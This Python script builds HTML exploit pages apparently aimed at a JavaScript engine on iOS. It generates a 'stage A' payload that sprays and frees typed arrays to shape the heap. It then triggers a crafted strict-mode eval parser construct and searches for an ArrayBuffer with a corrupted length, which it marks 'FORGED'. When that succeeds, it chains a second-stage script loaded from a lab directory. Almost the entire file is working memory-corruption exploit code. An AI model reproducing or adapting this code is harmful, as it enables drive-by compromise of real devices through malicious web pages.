#!/usr/bin/env python3
"""Build the iOS hole-reuse parser stage A payloads (probe + final).

Host-only.  Writes into lab/ios_way/payload/.  No device/network access.
"""
import argparse, os, re, sys, zlib

HERE = os.path.dirname(os.path.abspath(__file__))
LAB = os.path.dirname(HERE)
ROOT = os.path.dirname(os.path.dirname(LAB))
STAGE_B = os.path.join(ROOT, 'lab', 'qjs_postsnapshot', 'ios_n1', 'payload',
                       'n1ios_stage2_ab72.js')

PAT = ("[0,0,0,0,1,0,0,0,255,255,0,0,255,255,255,255,255,255,255,255,"
       "255,255,255,255,1,0,0,0,255,255,255,255,255,255,255,255,255,255,255,255]")

SRC = ('"use strict";(function ([] = eval("(")) { var q1=0,q2=0,q3=0; '
       'return ' + '+'.join(['1.5'] * 34) + '; })')


def gen_stage_a(N, H, HN, VK0, C=34, SZ=957):
    src = ('"use strict";(function ([] = eval("(")) { var q1=0,q2=0,q3=0; '
           'return ' + '+'.join(['1.5'] * C) + '; })')
    return f'''"use strict";
var N={N},H={H},HN={HN},VK={VK0};
var PAT={PAT};
if (globalThis.PAT !== PAT) {{
  globalThis.RESULT="RESULT NO_TOPS";
  try{{document.getElementById("v").textContent=globalThis.RESULT;}}catch(e){{}}
}} else {{
var S=new Array(N),fb=new Uint8Array(40);
for(var j=0;j<40;j++)fb[j]=PAT[j];
for(var i=0;i<N;i++){{var u=new Uint8Array({SZ});S[i]=u;}}
for(var k=0;k<HN;k++)S[H+k]=null;
globalThis.f=(0,eval)({src!r});
var D=new Array(800);for(var i=0;i<800;i++)D[i]=new ArrayBuffer(64);
var TN=600,T=new Array(TN),TV=new Array(TN);
for(var i=0;i<TN;i++){{T[i]=new ArrayBuffer(72);TV[i]=new Uint8Array(T[i]);}}
var PH=[4,12,20,28,36],VKS=[{VK0},{VK0}-10,{VK0}-20,{VK0}-30,{VK0}-40];
var hit=-1,len=0,ph=-1,vk=-1,nt=0;
for(var pi=0;pi<5&&hit<0;pi++){{
  var p=PH[pi];
  for(var i=0;i<N;i++){{if(S[i]){{for(var o=p;o+40<={SZ};o+=40)S[i].set(fb,o);}}}}
  for(var vi=0;vi<5&&hit<0;vi++){{
    var v=VKS[vi]; if(v<16) continue;
    for(var r=0;r<8;r++){{var j=v-2*r;T[j]=null;TV[j]=null;}}
    try{{f();}}catch(e){{}}
    nt++;
    for(var i=0;i<TN;i++){{if(T[i]!==null&&T[i].byteLength!==72){{hit=i;len=T[i].byteLength;ph=p;vk=v;break;}}}}
  }}
}}
if(hit>=0){{globalThis.AB=T[hit];globalThis.ABV=TV[hit];globalThis.N1LEAK="FORGED";}}
globalThis.RESULT="RESULT HOLE C={C} SZ={SZ} N={N} H={H} HN={HN} HIT="+hit+" LEN="+len+" PH="+ph+" VK="+vk+" NT="+nt;
globalThis.N1MARK=globalThis.RESULT;
try{{document.getElementById("v").textContent=globalThis.RESULT;}}catch(e){{}}
try{{console.log("N1A:"+globalThis.RESULT);}}catch(e){{}}
}}
'''
def wrap(stage_a, stage_b=None):
    if stage_b is None:
        return ('<!doctype html><html><head><meta charset="utf-8"></head><body>\n'
                '<div id="v">N1IOS_HOLE</div>\n<script>' + stage_a + '</script>\n'
                '</body></html>')
    return ('<!doctype html><html><head><meta charset="utf-8"></head><body>\n'
            '<div id="v">N1IOS_HOLE</div>\n<script>' + stage_a + '</script>\n'
            '<script>if(globalThis.AB){' + stage_b + '}</script>\n'
            '</body></html>')


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--N', type=int, default=3000)
    ap.add_argument('--HN', type=int, default=64)
    ap.add_argument('--H', type=int, nargs='+', default=[64, 100, 200, 400])
    ap.add_argument('--VK', type=int, default=598)
    args = ap.parse_args()
    outdir = os.path.join(LAB, 'payload')
    os.makedirs(outdir, exist_ok=True)
    stage_b = open(STAGE_B).read()
    for H in args.H:
        a = gen_stage_a(args.N, H, args.HN, args.VK)
        probe = wrap(a)
        final = wrap(a, stage_b)
        for name, text in ((f'hole_stageA_probe_h{H}.html', probe),
                           (f'hole_stageA_final_h{H}.html', final)):
            p = os.path.join(outdir, name)
            open(p, 'w').write(text)
            print(f'{name}: raw={len(text)} zlib9={len(zlib.compress(text.encode(), 9))}')


if __name__ == '__main__':
    main()
